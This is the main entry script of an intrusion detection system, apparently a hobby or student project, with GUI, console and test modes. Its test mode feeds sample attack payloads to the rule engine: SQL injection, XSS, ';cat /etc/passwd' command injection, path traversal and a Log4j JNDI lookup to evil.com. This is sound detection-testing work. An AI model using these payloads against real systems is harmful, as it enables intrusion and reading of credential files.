"""
Jina IDS - Professional Network Intrusion Detection System
Main Entry Point

CEH-Level Cybersecurity Features:
- Real-time packet capture and DPI
- Signature-based detection (SQL injection, XSS, command injection, etc.)
- Anomaly-based detection using ML
- Port scan & DoS attack detection
- MITRE ATT&CK mapping
- Professional GUI dashboard
"""

import sys
import os
import signal
import argparse
import json
import time
from datetime import datetime

# Add project root to path
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, BASE_DIR)

from utils.config import load_config
from utils.logger import setup_logger


def parse_arguments():
    """Parse command line arguments."""
    parser = argparse.ArgumentParser(
        description="Jina IDS - Professional Network Intrusion Detection System",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python main.py                     # Launch GUI mode
  python main.py --no-gui            # Console mode
  python main.py --interface eth0    # Specify network interface
  python main.py --debug             # Enable debug logging
  python main.py --test              # Run tests without packet capture
        """
    )
    
    parser.add_argument("--config", type=str, default="config.json",
                        help="Path to configuration file")
    parser.add_argument("--debug", action="store_true",
                        help="Enable debug mode")
    parser.add_argument("--no-gui", action="store_true",
                        help="Run in console mode without GUI")
    parser.add_argument("--interface", type=str, default=None,
                        help="Network interface to capture from")
    parser.add_argument("--test", action="store_true",
                        help="Run in test mode (no packet capture)")
    parser.add_argument("--list-interfaces", action="store_true",
                        help="List available network interfaces and exit")
    parser.add_argument("--no-ml", action="store_true",
                        help="Disable ML-based detection")
    
    return parser.parse_args()


def list_interfaces():
    """List available network interfaces."""
    from core.packet_capture import PacketCapture
    
    print("\n=== Available Network Interfaces ===\n")
    interfaces = PacketCapture.list_interfaces()
    
    if not interfaces:
        print("No interfaces found. Are you running as root?")
        return
    
    for iface in interfaces:
        print(f"  {iface['name']:15} - {iface['address']}")
    
    print("\nTip: Use --interface <name> to capture from a specific interface")


def run_console_mode(config: dict, logger, args):
    """Run IDS in console mode without GUI."""
    from core.detector import IntrusionDetector
    from core.rule_engine import Alert
    
    print("""
    ╔══════════════════════════════════════════════════════════════╗
    ║     ██╗██╗███╗   ██╗ █████╗     ██╗██████╗ ███████╗          ║
    ║     ██║██║████╗  ██║██╔══██╗    ██║██╔══██╗██╔════╝          ║
    ║     ██║██║██╔██╗ ██║███████║    ██║██║  ██║███████╗          ║
    ║██   ██║██║██║╚██╗██║██╔══██║    ██║██║  ██║╚════██║          ║
    ║╚█████╔╝██║██║ ╚████║██║  ██║    ██║██████╔╝███████║          ║
    ║ ╚════╝ ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝    ╚═╝╚═════╝ ╚══════╝          ║
    ║                                                              ║
    ║          Professional Network Intrusion Detection            ║                        ║
    ╚══════════════════════════════════════════════════════════════╝
    """)
    
    # Override config with CLI args
    if args.interface:
        config.setdefault("capture", {})["interface"] = args.interface
    
    if args.no_ml:
        config.setdefault("detection", {})["enable_ml"] = False
    
    # Alert counter
    alert_counts = {"critical": 0, "high": 0, "medium": 0, "low": 0}
    
    def alert_callback(alert: Alert):
        """Handle alerts in console mode."""
        alert_counts[alert.severity] = alert_counts.get(alert.severity, 0) + 1
        
        # Color coding for terminal
        colors = {
            "critical": "\033[91m",  # Red
            "high": "\033[93m",      # Yellow
            "medium": "\033[94m",    # Blue  
            "low": "\033[92m",       # Green
        }
        reset = "\033[0m"
        color = colors.get(alert.severity, "")
        
        print(f"\n{color}{'='*60}")
        print(f"🚨 ALERT: {alert.rule_name}")
        print(f"   Severity: {alert.severity.upper()}")
        print(f"   Category: {alert.category}")
        print(f"   Source: {alert.src_ip}:{alert.src_port}")
        print(f"   Destination: {alert.dst_ip}:{alert.dst_port}")
        print(f"   Protocol: {alert.protocol}")
        if alert.mitre_attack:
            print(f"   MITRE ATT&CK: {alert.mitre_attack}")
        print(f"   Description: {alert.description}")
        if alert.matched_content:
            print(f"   Matched: {alert.matched_content[:100]}")
        print(f"{'='*60}{reset}")
    
    # Create detector
    detector = IntrusionDetector(config.get("detection", {}))
    detector.register_alert_callback(alert_callback)
    
    logger.info("Starting Intrusion Detection System in console mode")
    logger.info(f"Interface: {detector.packet_capture.interface}")
    
    # Start detection
    if not detector.start(background=True):
        logger.error("Failed to start detector. Are you running as root?")
        return 1
    
    print(f"\n[+] Monitoring on interface: {detector.packet_capture.interface}")
    print("[+] Press Ctrl+C to stop\n")
    
    # Signal handler for graceful shutdown
    def signal_handler(sig, frame):
        print("\n[*] Shutting down...")
        detector.stop()
        
        # Print summary
        print("\n" + "="*60)
        print("                    SESSION SUMMARY")
        print("="*60)
        stats = detector.get_stats()
        print(f"  Duration: {stats.get('uptime_seconds', 0):.1f} seconds")
        print(f"  Packets Processed: {stats.get('packets_processed', 0)}")
        print(f"  Packets/Second: {stats.get('packets_per_second', 0):.1f}")
        print(f"\n  Alerts by Severity:")
        for severity, count in sorted(alert_counts.items()):
            if count > 0:
                print(f"    {severity.capitalize()}: {count}")
        print("="*60 + "\n")
        
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    # Main loop - display stats periodically
    last_stats_time = time.time()
    while True:
        time.sleep(1)
        
        # Print stats every 30 seconds
        if time.time() - last_stats_time >= 30:
            stats = detector.get_stats()
            pps = stats.get("packets_per_second", 0)
            total = stats.get("packets_processed", 0)
            alerts = stats.get("alerts_generated", 0)
            
            print(f"\r[Stats] Packets: {total} | PPS: {pps:.1f} | Alerts: {alerts}", end="")
            last_stats_time = time.time()


def run_test_mode(config: dict, logger):
    """Run tests without packet capture."""
    print("\n=== Running Jina IDS Tests ===\n")
    
    # Test rule engine
    print("[*] Testing Rule Engine...")
    from core.rule_engine import RuleEngine
    
    engine = RuleEngine()
    stats = engine.get_rule_stats()
    print(f"    Loaded {stats['total_rules']} detection rules")
    
    # Test payloads
    test_cases = [
        (b"SELECT * FROM users WHERE id=1 UNION SELECT password", "SQL Injection"),
        (b"<script>alert('xss')</script>", "XSS"),
        (b";cat /etc/passwd", "Command Injection"),
        (b"../../etc/passwd", "Path Traversal"),
        (b"${jndi:ldap://evil.com/a}", "Log4j"),
        (b"normal web traffic", "Normal (should not alert)")
    ]
    
    print("\n    Testing Payload Detection:")
    for payload, description in test_cases:
        alerts = engine.check_payload(payload)
        status = "✓ DETECTED" if alerts else "○ No alert"
        print(f"      {description}: {status}")
    
    # Test analyzer
    print("\n[*] Testing Traffic Analyzer...")
    from core.analyzer import TrafficAnalyzer
    
    analyzer = TrafficAnalyzer()
    print(f"    Analyzer initialized successfully")
    
    # Test ML detector
    print("\n[*] Testing ML Detector...")
    try:
        from ml.detector import MLAnomalyDetector
        ml = MLAnomalyDetector()
        print(f"    ML Detector initialized: {ml.model_type} mode")
    except Exception as e:
        print(f"    ML Detector: {e}")
    
    print("\n=== All Tests Passed ===\n")
    return 0


def run_gui_mode(config: dict, base_dir: str, logger, args):
    """Run IDS with GUI."""
    try:
        from PyQt6.QtWidgets import QApplication
        from gui.app import IDSApplication
    except ImportError:
        logger.error("PyQt6 not installed. Install with: pip install PyQt6")
        logger.info("Falling back to console mode...")
        return run_console_mode(config, logger, args)
    
    # Override config with CLI args
    if args.interface:
        config.setdefault("capture", {})["interface"] = args.interface
    
    if args.no_ml:
        config.setdefault("detection", {})["enable_ml"] = False
    
    app = QApplication(sys.argv)
    app.setApplicationName("Jina IDS - Network Intrusion Detection")
    app.setOrganizationName("Jina Security")
    
    # Set application style
    app.setStyle("Fusion")
    
    window = IDSApplication(config, base_dir, logger)
    window.show()
    
    return app.exec()


def main():
    """Main entry point."""
    args = parse_arguments()
    
    # Create necessary directories
    os.makedirs(os.path.join(BASE_DIR, "data", "logs"), exist_ok=True)
    os.makedirs(os.path.join(BASE_DIR, "data", "models"), exist_ok=True)
    os.makedirs(os.path.join(BASE_DIR, "data", "rules"), exist_ok=True)
    
    # Setup logging
    log_file = os.path.join(BASE_DIR, "data", "logs", "ids.log")
    logger = setup_logger(log_file, debug=args.debug)
    
    logger.info("="*50)
    logger.info("Jina IDS - Starting")
    logger.info(f"Time: {datetime.now().isoformat()}")
    logger.info("="*50)
    
    # Handle --list-interfaces
    if args.list_interfaces:
        list_interfaces()
        return 0
    
    # Load configuration
    config_file = args.config
    if not os.path.isabs(config_file):
        config_file = os.path.join(BASE_DIR, config_file)
    
    try:
        config = load_config(config_file)
        logger.info(f"Configuration loaded from {config_file}")
    except FileNotFoundError:
        logger.warning(f"Configuration file not found: {config_file}")
        logger.info("Using default configuration")
        config = load_config(None)
    
    # Run in appropriate mode
    if args.test:
        return run_test_mode(config, logger)
    elif args.no_gui:
        return run_console_mode(config, logger, args)
    else:
        return run_gui_mode(config, BASE_DIR, logger, args)


if __name__ == "__main__":
    sys.exit(main() or 0)
